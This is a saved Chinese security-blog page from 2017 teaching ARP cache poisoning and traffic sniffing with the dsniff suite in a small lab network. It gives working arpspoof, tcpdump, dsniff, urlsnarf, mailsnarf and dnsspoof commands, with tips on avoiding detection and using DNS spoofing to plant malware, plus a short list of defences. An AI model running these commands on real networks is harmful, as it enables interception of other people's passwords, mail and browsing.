@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="熟练使用 dsniff套件 进行嗅探"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>熟练使用 dsniff套件 进行嗅探 - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/10/23/dsniff/">
+                熟练使用 dsniff套件 进行嗅探
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-10-23</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/dsniff/">dsniff</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>0x01 嗅探之前,我们有必要先来大致回顾下arp和rarp的基本通信流程,假设现在交换机中的mac地址表中暂时还没有任何对应关系<code>A机器想和B机器进行通信</code><br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">arp  地址解析协议,即通过ip找对应的<span class="keyword">mac</span>:</div><div class="line">首先,A会先发arp请求[广播],向同一交换机下的所有其它机器询问,谁有B的这个ip</div><div class="line">当B收到这条消息时,就会再用arp响应给A,说,我有这个ip,我的<span class="keyword">mac</span>是多少...</div><div class="line">当完成第一次正常通信之后就会在交换机的<span class="keyword">mac</span>地址表中记录下这层指向对应关系</div><div class="line">后续就直接按照<span class="keyword">mac</span>地址表中已有的指向来通信,而不再用广播询问,这就是一次极为常规的arp通信过程</div></pre></td></tr></table></figure></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">rarp</span>  反向地址解析协议,即通过mac找对应的<span class="built_in">ip</span>:</div><div class="line">理解完arp以后,我们再来看rarp,同样是先发请求,这个请求简单来讲也是一个广播,不过,在此广播中声明了自己的mac</div><div class="line">并请求任何收到此请求的rarp服务器分配一个<span class="built_in">ip</span>,当同网段的rarp服务器收到此请求后会检查自己的rarp列表找到该mac对应的<span class="built_in">ip</span></div><div class="line">如果此mac的<span class="built_in">ip</span>被找到,就直接响应对方使用,如果没找到,最后就会提示初始化失败</div></pre></td></tr></table></figure>
+<p>0x02 关于arp欺骗最核心的细节<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">假设同一交换机下有三台机器,分别为 A , <span class="keyword">B </span>, C,正常情况下<span class="keyword">B和C的通信数据,A是不可能看到的</span></div><div class="line">但在ARP缓存表机制中存在一个缺陷,就是当请求主机收到ARP应答包后,不会去验证自己曾经是否向对方主机发送过ARP请求</div><div class="line">就直接就把这个应答包中的<span class="built_in">IP</span>与MAC地址的对应关系更新到自己本地的ARP缓存表中,这时就直接导致原有<span class="built_in">IP</span>的对应关系被恶意替换</div><div class="line">通俗点儿理解,也就是说,我强制刷新了对方的arp缓存对应关系,把原来<span class="built_in">ip</span>的指向现在换成了我自己的地址</div><div class="line">导致现在<span class="keyword">B和C的通信都要先经过A,那么,我们在A上自然就可以顺利的看到C和B之间的所有明文通信数据,即实现了所谓的监听</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>0x03 简单的arp欺骗实战利用演示</p>
+<p>首先,开启本地的路由转发功能,让所有被嗅探的目标都通过你的机器来正常上网,所以必须在你本机开启转发,不然会导致目标无法上网,也很可能被人察觉</p>
+<p>永久开启转发:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /etc/sysctl.conf</span></div><div class="line">  net.ipv4.<span class="attribute">ip_forward</span>=1</div><div class="line"><span class="comment"># sysctl -p</span></div></pre></td></tr></table></figure></p>
+<p>临时开启转发:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span></div></pre></td></tr></table></figure></p>
+<p>此次用于实验的环境大致如下<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">centos6</span><span class="selector-class">.8</span> <span class="selector-tag">x86_64</span> <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.4</span> <span class="selector-tag">eth2</span>  <span class="selector-tag">mac</span>: 00<span class="selector-pseudo">:0C</span><span class="selector-pseudo">:29</span><span class="selector-pseudo">:C4</span><span class="selector-pseudo">:A0</span><span class="selector-pseudo">:95</span>   嗅探者的机器 <span class="selector-tag">dsniff</span></div><div class="line"><span class="selector-tag">win7</span> <span class="selector-tag">x64</span>  	 <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.8</span>       <span class="selector-tag">mac</span>: 00<span class="selector-tag">-0C-29-3B-BF-A8</span>   被嗅探的机器</div><div class="line"><span class="selector-tag">win</span> 2008<span class="selector-tag">R2</span>  	 <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span>      <span class="selector-tag">mac</span>: 00<span class="selector-tag">-0C-29-6C-55-D2</span>   上面已经事先配置好了各种服务</div><div class="line">网关		 <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.1</span>       <span class="selector-tag">mac</span>: <span class="selector-tag">dc-ee-06-96-b7-b7</span></div></pre></td></tr></table></figure></p>
+<p>这次,我们直接利用epel源来安装dsniff,最好别自己用源码装,不然你会发现这就是个死循环,编译过程中的问题会非常的多,而且解决起来也比较周折,确实没必要在那上面浪费太多时间<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> yum install epel-release -y</span></div><div class="line"><span class="meta">#</span><span class="bash"> yum install dsniff -y</span></div></pre></td></tr></table></figure></p>
+<p>arpspoof 的两种缓存毒化方式,实战中尽量先让它跑一会儿,感觉毒化的差不多了,再开始嗅探数据</p>
+<p>在目标机器上观察毒化前的网关mac是多少<br><img src="/img/arp_a_before.png" alt=""></p>
+<p>单向欺骗,实战中最好用单向欺骗,相对不易被察觉<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># arpspoof -i eth2 -t <span class="number">192.168</span><span class="number">.3</span><span class="number">.8</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span> &amp;&gt;/dev/null</div><div class="line"># arpspoof -i eth2 -t <span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.4</span> &amp;&gt;/dev/null</div><div class="line"># killall arpspoof	停止arpspoof,最好连续多执行几次,执行到提示没有该进程为止</div></pre></td></tr></table></figure></p>
+<p><img src="/img/arpspoof_sinale.png" alt=""><br><img src="/img/arpspoof_sinale_res.png" alt=""></p>
+<p>双向欺骗,被嗅探的机器是无法正常上网的,不建议用<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">arpspoof</span> <span class="selector-tag">-i</span> 网卡接口 <span class="selector-tag">-t</span> 目标机器<span class="selector-tag">ip</span>  <span class="selector-attr">[-r 用来捕获两个方向的数据,默认是单向的]</span> 网关<span class="selector-tag">ip</span></div><div class="line"># <span class="selector-tag">arpspoof</span> <span class="selector-tag">-i</span> <span class="selector-tag">eth2</span> <span class="selector-tag">-t</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.8</span> <span class="selector-tag">-r</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.1</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/arpspoof_reverse.png" alt=""></p>
+<p>再次,回到被嗅探的目标机器上观察毒化后的网关mac变成了多少<br><img src="/img/arp_a_after.png" alt=""></p>
+<p>利用各类嗅探工具截获流过本地的所有明文密码,图片数据,这里不一定非要用自带的dsniff,driftnet,比如,tcpdump,ettercap,各类py脚本…也都是非常不错的选择,反正别人机器上的数据都已经流过你的机器了,至于怎么截获,方法就非常多了,注意网卡不要抓错了,一定抓那个正在用于嗅探的网卡<br><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># tcpdump -i eth2 -s <span class="number">0</span> -nnA <span class="symbol">'tcp</span> dst <span class="keyword">port</span> <span class="number">80</span> <span class="keyword">and</span> host <span class="number">192.168</span>.<span class="number">3.8</span> <span class="keyword">and</span> (tcp[((tcp[<span class="number">12</span>:<span class="number">1</span>] &amp; <span class="number">0</span>xf0) &gt;&gt; <span class="number">2</span>):<span class="number">4</span>] = <span class="number">0</span>x504f5354)'</div></pre></td></tr></table></figure></p>
+<p><img src="/img/discuz_pass_arp.png" alt=""></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> dsniff -i eth2</span></div><div class="line"><span class="meta">#</span><span class="bash"> driftnet -i eth0</span></div></pre></td></tr></table></figure>
+<p><img src="/img/arpsoof_res.png" alt=""></p>
+<p>尝试利用urlsnarf截获目标的http url访问记录,主要是想看看目标内网还有没有其它的web之类的,抓到密码以后好针对性的下手,如果内容太多看着比较乱,可以使用-v选项指定过滤正则<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> urlsnarf -i eth2</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/arpspoof_urlsnarf.png" alt=""></p>
+<p>尝试利用dnsspoof进行简单的dns欺骗,可以适当的用它来钓鱼挂马什么的<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> dnsspoof -i eth2 -f /etc/hosts</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/arpspoof_hosts.png" alt=""><br><img src="/img/dnsspoof_res.png" alt=""><br><img src="/img/dnsspoof_res_2.png" alt=""></p>
+<p>尝试利用 filesnarf 抓取往nfs共享目录中保存的文件,意思就是只要被嗅探的机器往nfs server共享目录存文件,也会自动复制到本地一份,速度可能会稍慢,比较简单,这里就不演示了<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> filesnarf -i eth2</span></div></pre></td></tr></table></figure></p>
+<p>尝试利用mailsnarf嗅探各类邮件数据,同样它也支持正则输出<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mailsnarf -<span class="selector-tag">i</span> eth2</div></pre></td></tr></table></figure></p>
+<p>关于dsniff套件中的其它小工具这里就不一一说了,使用都非常简单,大家可以自己在实战中慢慢体会</p>
+<p>0x05 关于arp防御的问题<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">绑定网关ip与mac</div><div class="line">绑定本机Arp缓存表中网关的Mac<span class="built_in"> IP</span></div><div class="line">上靠谱的arp防火墙</div><div class="line"><span class="built_in">..</span>.</div></pre></td></tr></table></figure></p>
+<p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;迫不得已要嗅的时候,最好先仔细挑好目标机器,有针对性的嗅,切记千万不要一上来就全网段大规模的嗅,如果对方网络比较大,你的网卡很可能会撑不住,极易把别人搞掉线,另外,这样干,动静儿也非常大,一般拿到有用的东西,立马停掉即可,嗅的时间最好也不要太长,另外,关于嗅https明文密码和其它各类嗅探工具的使用,我们后续会慢慢再说,其实,说心里话,防护稍微好一点的内网,基本是没什么太多的机会给你嗅的,不过C段的时候还是可以试试的,^_^ 待续…</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/dsniff/">#dsniff</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
